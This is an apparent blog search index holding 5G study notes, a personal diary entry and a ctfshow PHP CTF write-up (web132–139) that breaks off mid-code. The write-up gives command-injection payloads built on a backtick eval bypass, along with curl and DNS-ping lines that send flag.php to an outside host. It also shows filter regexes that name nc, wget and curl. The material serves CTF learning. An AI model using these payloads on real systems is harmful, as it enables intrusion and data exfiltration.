<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2021/10/23/burpsuit/"/>
      <url>/2021/10/23/burpsuit/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/u011781521/article/details/54772795">https://blog.csdn.net/u011781521/article/details/54772795</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/10/23/celluernetwork/"/>
      <url>/2021/10/23/celluernetwork/</url>
      
        <content type="html"><![CDATA[<h2 id="5G"><a href="#5G" class="headerlink" title="5G"></a>5G</h2><h3 id="演变"><a href="#演变" class="headerlink" title="演变"></a>演变</h3><p>由分到合</p><p><img src="1.png"></p><p>于是，加入ITU(同时是建立标准的机构)<br>“IMT Vision – Framework and overall objectives of the future development<br>of IMT for 2020 and beyond</p><p>建立一个框架，要求如下</p><p><img src="2.png"></p><h3 id="3GPP"><a href="#3GPP" class="headerlink" title="3GPP"></a>3GPP</h3><h4 id="Release-15"><a href="#Release-15" class="headerlink" title="Release 15"></a>Release 15</h4><p>set the foundation to enable commercial standards-based 5G New Radio (NR) deployments。</p><h4 id="Release-16-on-July-3-2020"><a href="#Release-16-on-July-3-2020" class="headerlink" title="Release 16 on July 3,2020."></a>Release 16 on July 3,2020.</h4><p>➢ Key technologies in Release 16 are geared（适应） toward transforming industry by expanding 5G from mobile broadband into new areas that weren’t addressed or didn’t have mobile capabilities<br>in the past.</p><h3 id="Applications"><a href="#Applications" class="headerlink" title="Applications"></a>Applications</h3><h4 id="Enhanced-Mobile-Broadband-eMBB"><a href="#Enhanced-Mobile-Broadband-eMBB" class="headerlink" title="Enhanced Mobile Broadband (eMBB)"></a>Enhanced Mobile Broadband (eMBB)</h4><ul><li><p>Better mobile phones and hot spots. High data rates, high user density. Human centric communications</p></li><li><p>Massive(大型) Machine Type Communications (mMTC) </p></li><li><p>Very large number of devices, low data rate, low power. IoT（物联网） with long battery life time. Addition to GSM, Zigbee, etc. Machine-centric communication.</p></li></ul><h4 id="Ultra-Reliable-and-Low-Latency-Communications-URLLC"><a href="#Ultra-Reliable-and-Low-Latency-Communications-URLLC" class="headerlink" title="Ultra-Reliable and Low Latency Communications (URLLC)"></a>Ultra-Reliable and Low Latency Communications (URLLC)</h4><p>Vehicle-to-Vehicle communication, Industrial IoT, 3D Gaming. Human and Machine centric communication</p><p>例如：无人驾驶</p><p><img src="3.png"></p><h3 id="Spectrum"><a href="#Spectrum" class="headerlink" title="Spectrum"></a>Spectrum</h3><p>World Radio-communications Conference (WRC) determines the spectrum requirements</p><p>Two Frequency Ranges (FRs)</p><p>➢ FR1: Sub 6-GHz(450Mhz-6000Mhz). Several new bands in this range.</p><p>➢ FR2: 24.25-52.6 GHz (mm-Waves): Good for high throughput in small cells</p><p>NR specs list 26 operating bands for FR1 and 3 for FR2</p><h3 id="technologies"><a href="#technologies" class="headerlink" title="technologies"></a>technologies</h3><p>Heterogeneous networks(异构网络) ⚫ Massive MIMO（巨大多入多出）<br>⚫ Millimeter wave ⚫ Spatial sharing<br>⚫ Non-orthogona（）非正交l multiple access (NOMA) ⚫ New radio(5G NR) ⚫ Network slicing（切片）<br>⚫ Advanced coding and modulation ⚫ Flexible spectrum access<br>⚫ Vehicle-to-everything (V2X)</p><h4 id="Heterogeneous-networks-HetNet"><a href="#Heterogeneous-networks-HetNet" class="headerlink" title="Heterogeneous networks(HetNet)"></a>Heterogeneous networks(HetNet)</h4><p>It is increasingly difficult to meet data transmission demands in densely populated areas</p><ul><li><p>small cell</p><p>  small range and low power</p></li><li><p>Macro cell </p><p>  large range and highly users</p></li></ul><p><img src="4.png"></p><ul><li>HetNet</li></ul><h4 id="Massive-MIMO"><a href="#Massive-MIMO" class="headerlink" title="Massive MIMO"></a>Massive MIMO</h4><p>➢ Single-user MIMO systems were used for 3G </p><p>➢ 4G adopted multi-user MIMO system technology </p><p>➢ With more than one hundred antennas and dozens of antenna ports equipped in a base station, massive MIMO can be used for centralized(集中) or distributed（分布） type</p><h4 id="Spatial-sharing"><a href="#Spatial-sharing" class="headerlink" title="Spatial sharing"></a>Spatial sharing</h4><h4 id="millimeter-wave-mmWave"><a href="#millimeter-wave-mmWave" class="headerlink" title="millimeter wave (mmWave)"></a>millimeter wave (mmWave)</h4><p>Millimeter wave is the band of spectrum more than 24Ghz, can be used for high-speed wireless broadband<br>communications.</p><p>1‐10 mmwavelength = 30 to 300 GHz</p><p>Challenges: range, cost, channel estimation, large arrays(天线数组)</p><h4 id="Non-orthogonal-Multiple-Access-NOMA"><a href="#Non-orthogonal-Multiple-Access-NOMA" class="headerlink" title="Non-orthogonal Multiple Access (NOMA)"></a>Non-orthogonal Multiple Access (NOMA)</h4><p>Disadvantages of orthogonal Multiple Access(OMA)：</p><p>Dilemma to realize a better trade-off between throughput and user fairness, illustrated in the following example:</p><ul><li><p>A user with a poor connection to the base station (BS) is served by using OMA. </p><ul><li><p>Spectral efficiency is low since this user cannot utilize the allocated bandwidth efficiently.</p></li><li><p>Since OMA is used, the bandwidth resources occupied by this user cannot be shared by the others.</p></li></ul></li></ul><p>Difficult to support massive connectivity：</p><ul><li>The three key requirements for 5G are to support high throughput, low latency and massive connectivity</li></ul><p>A promising solution is to break orthogonality → NOMA （不是平均分配）</p><p>➢ The key idea of NOMA is to encourage spectrum sharing</p><p>The primary reason for adopting NOMA in 5G owes to its ability of serving multiple users using the same time and<br>frequency resources</p><p><img src="5.png"></p><h4 id="5G-New-Radio"><a href="#5G-New-Radio" class="headerlink" title="5G New Radio"></a>5G New Radio</h4><p>Two major ways being developed to deploy 5G radio:<br>➢ non-standalone(NSA) mode 非独立组网</p><p>In NSA mode,the 5G radio (known as gNB) is colocated with an LTE base station (eNB) and connects to the 4G core (EPC)</p><p>➢ standalone (SA) mode 独立组网</p><p><img src="6.png"></p><h4 id="Vehicular-Networks"><a href="#Vehicular-Networks" class="headerlink" title="Vehicular Networks"></a>Vehicular Networks</h4><h4 id="Network-slicing"><a href="#Network-slicing" class="headerlink" title="Network slicing"></a>Network slicing</h4><p>Each logical network serves a specific service type or industry user. Each network slice can flexibly define its logical topology.</p><p>➢ Slice = A logical network serving a particular application, business partner, or customer<br>➢ Similar to Virtual Machines (VMs) on a computer<br>➢ A network can be divided in to many slices<br>➢ Each slice looks to the user as a separate network with reserved<br>resources</p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/10/23/sui-sui-nian/"/>
      <url>/2021/10/23/sui-sui-nian/</url>
      
        <content type="html"><![CDATA[<p>今天学校里进行了一个选拨赛，不出意外，自己啥也不会。我是一个很理想主义的人，同时更是一个只敢想不愿实际去努力的人，回顾过去的两年，我真的十分后悔。后悔自己没有努力，没有真正为了梦想去付出。无数次，我想去揍曾经的自己。大三了，自己收获了什么呢？也许只有年龄的徒增罢了。曾经想要保研，大一下学期玩了一学期，绩点直接被拉了下了，保研成了泡沫。我想要竞赛，结果什么东西都没学。如今，回过头去看，自己真可谓一事无成，如今还有希望只有考研，这也是如今我唯一的出路。</p><p>现在，开学一个月了，我是否真的学到了东西呢？学到了，但是远远不够，我从中学到最重要的不是关于安全的知识，而是自己基础的薄弱。编程能力差，计算机的基础知识掌握不够，如今的我又怎么可以说去学安全呢？</p><p>现在想来，是不是还不迟呢？迟了，但又能怎样的，只在这里自我否认，又能收获什么呢？现在赶紧去学，沿着别人的成功路，逐渐前进。把基础补一补，没有完成的目标，成为研究生后去完成。研究生的三年，用来弥补自己的不足，不要自悲自叹了。加油去做把。</p><pre><code>                                                                            2021年10月9日 11教留</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/10/23/md5/"/>
      <url>/2021/10/23/md5/</url>
      
        <content type="html"><![CDATA[<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/yesec/p/12535534.html">https://www.cnblogs.com/yesec/p/12535534.html</a></p><p>[MRCTF2020]Ez_bypass</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>test</title>
      <link href="/2021/10/23/test/"/>
      <url>/2021/10/23/test/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshowPHP特性-下</title>
      <link href="/2021/10/22/ctfshowphp-te-xing-xia/"/>
      <url>/2021/10/22/ctfshowphp-te-xing-xia/</url>
      
        <content type="html"><![CDATA[<h2 id="Web132"><a href="#Web132" class="headerlink" title="Web132"></a>Web132</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">===</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x36D</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">===</span> <span class="token variable">$flag</span> <span class="token operator">||</span> <span class="token variable">$username</span> <span class="token operator">===</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关键的突破点是$code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===”admin”，因为或运算我们保证后面的正确即可。</p><p>最后payload：</p><p>?username=admin&amp;password=1&amp;code=admin</p><h2 id="Web133"><a href="#Web133" class="headerlink" title="Web133"></a>Web133</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$F</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/system|nc|wget|exec|passthru|netcat/i'</span><span class="token punctuation">,</span> <span class="token variable">$F</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"6个字母都还不够呀?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>经过测试，这里是没有回显的。</p><p>我们如何绕过substr的。我们可以传入F=<code>$F</code>; （这里有空格），正好6个字符。我们在后面再添加一些内容，比如sleep 3。经过eval以及``后，我们传入的语句变为了</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">get传参   <span class="token constant">F</span><span class="token operator">=</span><span class="token string backtick-quoted-string">`$F `</span><span class="token punctuation">;</span>sleep <span class="token number">3</span>经过<span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span>截取后 得到  <span class="token string backtick-quoted-string">`$F`</span><span class="token punctuation">;</span> 也就是会执行 <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"`<span class="token interpolation"><span class="token variable">$F</span></span>`; "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>我们把原来的<span class="token variable">$F</span>带进去<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"``<span class="token interpolation"><span class="token variable">$F</span></span> `;sleep 3`"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>也就是说最终会执行  <span class="token string backtick-quoted-string">`   `</span><span class="token variable">$F</span> <span class="token string backtick-quoted-string">`;sleep 3  `</span> <span class="token operator">==</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"`<span class="token interpolation"><span class="token variable">$F</span></span> `;sleep 3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>这里和一个套娃一样，可能也是这个原因，我们可以执行后面的语句。而后面的语句我们是可控的这样就在服务器上成功执行了 sleep <span class="token number">3</span>所以 最后就是一道无回显的<span class="token constant">RCE</span>题目了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么我们接下来怎么做呢？我们可以使用外带的方式，但是我对此还是研究不深，等之后再尝试一下吧，这里主要采用burpsuit的方式。</p><p>payload=curl -X POST -F xx=@flag.php <a href="http://xxx/">http://xxx</a></p><p>首先</p><p><img src="131-1.png"></p><p>之后</p><p><img src="133-2.png"></p><p>最后查看即可</p><p><img src="133-3.png"></p><h2 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$key1</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$key2</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nonononono"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key1</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'36d'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$key2</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'36d'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>考察点 :POST数组的覆盖</p><p>所以payload可以为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">payload<span class="token punctuation">:</span><span class="token constant">_POST</span><span class="token punctuation">[</span>key1<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">36</span>d<span class="token operator">&amp;</span><span class="token constant">_POST</span><span class="token punctuation">[</span>key2<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">36</span>d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$F</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i'</span><span class="token punctuation">,</span> <span class="token variable">$F</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"师傅们居然破解了前面的，那就来一个加强版吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>考察点：与web133相同，仍然为substr的绕过以及外带。歹势这里curl被过滤了，我们尝试一下dnslog</p><pre class="line-numbers language-none"><code class="language-none">payload: F&#x3D;&#96;$F &#96;;ping &#96;awk &#39;&#x2F;flag&#x2F;&#39; flag.php&#96;.n1ssm0.dnslog.cn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但是这里没有办法使用，但是这里写文件没有限制</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">F</span><span class="token operator">=</span><span class="token string backtick-quoted-string">`$F `</span><span class="token punctuation">;</span>nl f<span class="token operator">*</span> <span class="token operator">></span> <span class="token number">1.</span>txt<span class="token constant">F</span><span class="token operator">=</span><span class="token string backtick-quoted-string">`$F `</span><span class="token punctuation">;</span>nl f<span class="token operator">*</span><span class="token operator">></span>xxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><p>这次&lt;&gt; 被过滤了，但是我们还可以用tee来写。</p><p>常见的写文件操作</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">cp –r 源文件<span class="token punctuation">(</span>source<span class="token punctuation">)</span>  目的文件<span class="token punctuation">(</span>target<span class="token punctuation">)</span>。 参数r是指连同源文件中的子目录一同拷贝。pwd指令可立刻得知您目前所在的工作目录的绝对路径名称。 <span class="token operator">></span>mv<span class="token number">1.</span>作用mv命令用来为文件或目录改名，或者将文件由一个目录移入另一个目录中，它的使用权限是所有用户。该命令如同<span class="token constant">DOS</span>命令中的ren和move的组合。teee<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token class-name">ls</span><span class="token operator">|</span><span class="token class-name">tee</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>发现只有index文件，所以我们可以查找一下根目录</p><p>发现文件。</p><h2 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshow</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"private class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">payload:ctfshow&#x3D;ctfshow::getflag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">php中 <span class="token operator">-></span>与<span class="token operator">::</span> 调用类中的成员的区别<span class="token operator">-></span>用于动态语境处理某个类的某个实例<span class="token operator">::</span>可以调用一个静态的、不依赖于其他初始化的类方法<span class="token operator">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshow</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"private class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strripos</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">":"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"private function"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的考查点是对于call_user_func的使用，他可以传递一个数组。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$classname</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'say_hello'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>这时候会调用 classname中的 say_hello方法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\>|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span><span class="token punctuation">,</span> <span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'too young too simple sometimes naive!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token 